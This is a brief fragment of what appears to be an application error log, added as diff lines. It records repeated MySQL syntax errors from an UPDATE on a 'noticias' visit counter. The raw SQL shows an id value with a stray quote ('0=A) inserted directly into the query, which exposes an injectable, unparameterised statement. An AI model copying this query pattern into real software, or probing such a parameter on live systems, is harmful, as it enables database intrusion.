+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 04:06:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
